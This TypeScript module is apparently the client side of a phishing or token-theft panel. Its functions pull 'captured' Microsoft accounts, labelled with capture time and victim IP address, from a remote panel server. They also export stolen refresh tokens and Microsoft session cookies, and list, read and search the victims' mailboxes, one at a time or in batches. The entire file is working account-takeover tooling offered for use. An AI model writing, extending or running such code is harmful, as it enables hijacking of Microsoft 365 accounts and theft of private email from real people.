import { Panel } from '../../types/panel';

export async function fetchAccounts(panel: Panel) {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/tokens/captured`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch captured accounts: ${response.status}`);
  }
  const data = response.data as { success: boolean; tokens: any[] };
  if (!data.success || !Array.isArray(data.tokens)) {
    throw new Error('Invalid response from panel');
  }
  return data.tokens.map((token: any) => ({
    email: token.email,
    clientId: token.client_id,
    authorityEndpoint: token.authority_endpoint || 'https://login.microsoftonline.com/common',
    refreshToken: '',
    role: '',
    status: 'active',
    name: token.email.split('@')[0],
    notes: `Captured ${token.capture_time} from ${token.ip_address}`,
    lastRefresh: token.last_refresh,
    resource: token.resource || '00000002-0000-0ff1-ce00-000000000000',
    scopeType: token.scope_type || 'ews',
  }));
}

export async function exportToken(panel: Panel, email: string) {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/mailbox/${encodeURIComponent(email)}/export-token`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Token export failed: ${response.status}`);
  }
  return response.data;
}

export type PanelExportCookiesResult =
  | { ok: true; cookies: string }
  | { ok: false; status: number; error: string };

export async function exportMailboxCookies(
  panel: Panel,
  email: string,
): Promise<PanelExportCookiesResult> {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/mailbox/${encodeURIComponent(email)}/export-cookies`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (response.status === 404) {
    return {
      ok: false,
      status: 404,
      error:
        'This panel does not expose GET /api/mailbox/{email}/export-cookies yet. Add it on your panel server to return Microsoft session cookies (Netscape or Cookie header string) for the mailbox.',
    };
  }
  if (!response.ok) {
    return {
      ok: false,
      status: response.status,
      error: `export-cookies failed: HTTP ${response.status}`,
    };
  }
  const d = response.data;
  let cookies = '';
  if (d && typeof d === 'object') {
    if (typeof (d as any).cookies === 'string') cookies = (d as any).cookies;
    else if (typeof (d as any).cookieHeader === 'string') cookies = (d as any).cookieHeader;
    else if ((d as any).success && typeof (d as any).data === 'string') cookies = (d as any).data;
  } else if (typeof d === 'string') {
    cookies = d;
  }
  cookies = String(cookies || '').trim();
  if (!cookies) {
    return { ok: false, status: response.status, error: 'Panel returned an empty cookies payload' };
  }
  return { ok: true, cookies };
}

export async function fetchFolders(panel: Panel, email: string): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/folders`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch folders: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.folders)) {
    throw new Error('Invalid response from panel');
  }
  return response.data.folders;
}

export async function fetchEmails(
  panel: Panel,
  email: string,
  folder?: string,
  since?: string,
  limit: number = 50,
): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');

  const folders = await fetchFolders(panel, email);
  let folderId = folder || 'Inbox';
  const matched = folders.find(
    f => f.name.toLowerCase() === folderId.toLowerCase() || f.id === folderId,
  );
  if (matched) {
    folderId = matched.id;
  } else if (folders.length > 0) {
    folderId = folders[0].id;
  }

  const params = new URLSearchParams();
  if (since) params.append('since', since);
  params.append('limit', limit.toString());
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/folder/${encodeURIComponent(folderId)}/messages?${params.toString()}`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch emails: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.messages)) {
    throw new Error('Invalid response from panel');
  }
  return response.data.messages.map((msg: any) => ({
    ...msg,
    folder: folderId,
  }));
}

export async function searchEmails(
  panel: Panel,
  email: string,
  keywords: string[] = [],
  _folders: string[] = [],
  _dateRange?: { start?: string; end?: string },
  limit: number = 100,
): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');
  if (keywords.length === 0) return [];
  const query = keywords.join(' ');
  if (query.trim().length < 2) return [];
  const params = new URLSearchParams({
    q: query,
    limit: limit.toString(),
  });
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/search?${params.toString()}`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Search failed: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.results)) {
    throw new Error('Invalid response from panel');
  }
  return response.data.results.map((msg: any) => ({
    ...msg,
    folder: 'Search Results',
  }));
}

export async function exportTokensBatch(panel: Panel, emails: string[]) {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/tokens/export-batch`,
    method: 'POST',
    headers: { Authorization: `Bearer ${panel.token}` },
    body: { emails },
  });
  if (!response.ok) {
    throw new Error(`Batch token export failed: ${response.status}`);
  }
  return response.data;
}
